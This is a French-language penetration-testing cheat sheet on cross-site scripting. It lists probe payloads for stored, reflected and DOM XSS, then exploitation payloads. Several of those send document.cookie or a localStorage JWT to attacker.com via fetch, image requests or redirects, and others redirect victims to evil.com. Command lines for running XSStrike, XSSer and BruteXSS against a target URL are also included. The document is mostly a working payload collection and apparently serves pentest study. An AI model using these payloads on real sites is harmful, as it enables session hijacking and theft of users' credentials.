# XSS Enumeration & Exploitation

## Enumération : Trouver une stored XSS (Persistent XSS)
```js
<script>alert(1)</script>
```
*Test basique, pop-up si injectable.*

```js
<img src=x onerror=alert(1)>
``` 
*Pour tester les contextes d’attribut HTML.*

```js
<svg/onload=alert(1)>
``` 
*Pour voir si SVG passe (évite souvent des filtres).*

```js
<body onload=alert(1)>
```
*Pour tester injection dans le body.*

```js
<iframe src="javascript:alert(1)"></iframe>
```
*Pour repérer si les iframes ne sont pas filtrées.*

```js
<plaintext>test
```
*Pour casser tout le HTML suivant, voir si la page "freeze".*

```js
<script>print()</script>
```
*Pour tester là où alert() est bloqué.*

## Exploitation : Payloads utiles
```js
<script>document.location="https://attacker.com/steal?c="+document.cookie</script>
```
*Exfiltration de cookie.*

```js
<img src=x onerror="fetch('https://attacker.com/'+document.cookie)">
```
*Exfiltration discrète via fetch.*

```js
<script>new Image().src="https://attacker.com?"+document.cookie</script>
```
*Exfiltration de cookie via balise image.*

```js
<script>fetch('https://attacker.com/log?key='+localStorage.getItem('jwt'))</script>
```
*Récupération d’un token localStorage.*

```js
<svg/onload="alert(document.domain)">
```
*Affiche le nom de domaine (pratique pour pentest multi-domaine/iframe).*

---

## Enumération : Trouver une reflected XSS
```js
<script>alert(1)</script>
```
*Test basique dans le champ ou l’URL.*

```js
<img src=x onerror=alert(1)>
```
*Si contexte HTML attribut, simple et efficace.

```js
<svg/onload=alert(1)>
```
*Variante si le reste est filtré.*

```js
<body onload=alert(1)>
```
*Si la page te renvoie du contenu dans le body.*

```js
"><script>alert(1)</script>
```
*Si ton input se retrouve dans une balise ou un attribut (ferme la balise, injecte le script).*

```js
' onmouseover=alert(1) autofocus='
```  
*Si dans attribut HTML, déclenche au focus/survol.*

```js
<script>confirm(1)</script>
```
*Alternative si alert() est filtré.*

## Exploitation : Utilisation pour voler ou manipuler

```js
<script>alert(document.cookie)</script>
```  
*Affiche les cookies (à remplacer par de l’exfiltration).*

```js
<script>fetch('https://attacker.com/c?c='+document.cookie)</script>
```
*Exfiltration de cookies vers serveur attaquant.*

```js
<img src=x onerror="document.location='https://attacker.com/?cookie='+document.cookie">
``` 
*Redirection et exfiltration en image.*

```js
<svg/onload="document.write('HACKED')">
```  
*Ecrase la page et s’affiche (pour preuve visuelle).*

```js
<script>location='https://evil.com'</script>  
```
*Redirige la victime sur un site malveillant.*

---

## Enumération : Tester DOM XSS
```
<img src=x onerror=alert(1)>
```
*Classique, marche très souvent si innerHTML est vulnérable.*

```
<svg/onload=alert(1)>
```
*SVG passe parfois où <img> est filtré.*

```
<iframe src=javascript:alert(1)>
```
*Injection JS dans les iframes si acceptées.*

```
"><img src=x onerror=alert(1)>
```
*Ferme la balise si injection dans du HTML ou un attribut.*

```
<marquee onstart=alert(1)>
```
*Pour tester d'autres events HTML.*

```
javascript:alert(1)
```  
*Si le paramètre est réinjecté dans une URL ou un href.*

## Exploitation : Payloads utiles DOM
```
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```
*Exfiltration de cookie via DOM.*

```
<svg/onload="location='https://evil.com'">
```
*Redirige l’utilisateur via le DOM.*

```
<img src=x onerror="alert(document.domain)">
``` 
*Affiche le domaine pour vérifier la portée.*

```
<a href='javascript:alert(1)'>click</a>
```
*Clickable, déclenche l’alerte.*

```
<input autofocus onfocus=alert(1)>
```
*Exécution JS dès que le champ prend le focus.*

---

## XSS Découverte automatique (outils)

- **XSStrike**
  - git clone https://github.com/s0md3v/XSStrike.git
  - cd XSStrike
  - pip install -r requirements.txt
  - python xsstrike.py -u "http://target.com/page?param=test"

- **XSSer**
  - git clone https://github.com/epsylon/xsser.git
  - cd xsser
  - python xsser --url "http://target.com/page?param=test"

- **Brute XSS**
  - git clone https://github.com/shivangx01/BruteXSS.git
  - cd BruteXSS
  - python3 BruteXSS.py -u "http://target.com/page?param=test"

- **Burp Suite, ZAP, Nessus**  
  Scanners graphiques, utilisent des listes de payloads et détectent reflet ou exécution de JS.


### Code review : points à checker

- **Source** : Quels paramètres utilisateurs sont manipulés ? (input, query, URL, headers)
- **Sink** : Quelles fonctions JS ? (innerHTML, document.write, outerHTML, .append(), .html(), etc)
- **Filtrage** : Y a-t-il un filtre côté serveur ou client ?
- **Reflet** : L’entrée utilisateur est-elle reflétée dans la page sans encoding ?

## Ressources utiles

- [PayloadAllTheThings – XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadBox – XSS Payloads](https://github.com/payloadbox/xss-payload-list)
- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)


